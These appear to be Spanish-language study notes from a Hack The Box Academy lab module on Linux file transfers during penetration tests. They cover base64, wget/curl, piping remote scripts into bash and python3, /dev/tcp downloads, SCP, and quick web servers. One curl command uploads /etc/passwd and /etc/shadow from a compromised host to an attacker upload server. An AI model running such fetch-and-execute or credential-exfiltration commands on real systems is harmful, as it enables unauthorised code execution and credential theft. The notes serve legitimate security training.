## Download Operations
Tenemos acceso a la máquina. `NIX04`, y necesitamos descargar un archivo de nuestro `Pwnbox`máquina. Veamos cómo podemos lograr esto usando múltiples métodos de descarga de archivos.

![](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)
## Codificación/Decodificación Base64
Dependiendo del tamaño del archivo que queramos transferir, podemos utilizar un método que no requiera comunicación de red. Si tenemos acceso a una terminal, podemos codificar un archivo en una cadena base64, copiar su contenido en la terminal y realizar la operación inversa.

```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ md5sum hola.txt
1fec55901495925250c740e68f037e5c  hola.txt
```

Usamos cat para imprimir el contenido del archivo y codificamos en base64 la salida usando una tubería |. Utilizamos la opción -w 0 para crear sólo una línea y terminamos el comando con un punto y coma (;) y la palabra clave echo para iniciar una nueva línea y facilitar la copia.
#### Codifica la clave SSH en Base64
```js
┌──(pelado㉿kali)-[~/HTB/Academy/FileTransfer]
└─$ cat hola.txt |base64 -w 0;echo
SG9sYSBIVEIK
```

```js
htb-student@nix04:~$ echo -n 'SG9sYSBIVEIK' | base64 -d > hi.txt
```

Finalmente, podemos confirmar si el archivo se transfirió exitosamente usando el `md5sum` dominio.
```js
htb-student@nix04:~$ md5sum hi.txt 
1fec55901495925250c740e68f037e5c  hi.txt
```

## Web Downloads with Wget and cURL
Dos de las utilidades más comunes en las distribuciones de Linux para interactuar con aplicaciones web son `wget` y `curl`. Estas herramientas están instaladas en muchas distribuciones de Linux. Para descargar un archivo usando `wget`, necesitamos especificar la URL y la opción `-O' para establecer el nombre del archivo de salida.

```js
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` es muy similar a `wget`, pero la opción del nombre del archivo de salida es -o en minúscula.
```js
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless Attacks Using Linux
#### Fileless Download with cURL
```js
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
#### Fileless Download with wget
```js
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Download with Bash (/dev/tcp)
También puede haber situaciones en las que ninguna de las herramientas de transferencia de archivos más conocidas esté disponible. Siempre que esté instalada la versión 2.04 o superior de Bash (compilada con --enable-net-redirections), el archivo de dispositivo integrado /dev/TCP se puede utilizar para descargas de archivos simples.

#### Conéctese al servidor web de destino
```js
exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request
```js
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response
```js
cat <&3
```

## SSH Downloads
SSH (o Secure Shell) es un protocolo que permite el acceso seguro a computadoras remotas. La implementación de SSH viene con un `SCP` Utilidad para la transferencia remota de archivos que, de forma predeterminada, utiliza el protocolo SSH. 

#### Habilitando el servidor SSH
```js
sudo systemctl enable ssh
```
#### Iniciando el servidor SSH
```js
sudo systemctl start ssh
```
#### Comprobando el puerto de escucha SSH
```js
netstat -lnpt
```

#### Linux: descarga de archivos mediante SCP
```js
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## Upload Operations
## Web Upload
#### Instalar servidor web
```js
sudo python3 -m pip install --user uploadserver
```
Ahora necesitamos crear un certificado. En este ejemplo, utilizamos un certificado autofirmado.
#### Cear un certificado autofirmado
```js
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
El servidor web no debe alojar el certificado. Recomendamos crear un nuevo directorio para alojar el archivo en nuestro servidor web.
#### Iniciar servidor web
```js
sudo python3 -m uploadserver 443 --server-certificate /home/pelado/HTB/Academy/FileTransfer/server.pem
```

Ahora desde nuestra máquina comprometida, carguemos el `/etc/passwd` y `/etc/shadow` archivos.
```js
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
Usamos la opción `--insecure` porque utilizamos un certificado autofirmado en el que confiamos.

## Método alternativo de transferencia de archivos web
#### Creación de un servidor web con Python3
```js
python3 -m http.server
```

#### Creación de un servidor web con Python2.7
```js
python2.7 -m SimpleHTTPServer
```

#### Creación de un servidor web con PHP
```js
php -S 0.0.0.0:8000
```

#### Creación de un servidor web con Ruby
```js
ruby -run -ehttpd . -p8000
```

#### Descargue el archivo de la máquina de destino al Kali
```js
wget 192.168.49.128:8000/filetotransfer.txt
```

## SCP Upload
Es posible que encontremos algunas empresas que permitan la `SSH protocol` (TCP/22) para conexiones salientes, y si ese es el caso, podemos usar un servidor SSH con el `scp`Utilidad para subir archivos.
#### Carga de archivos usando SCP
```js
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```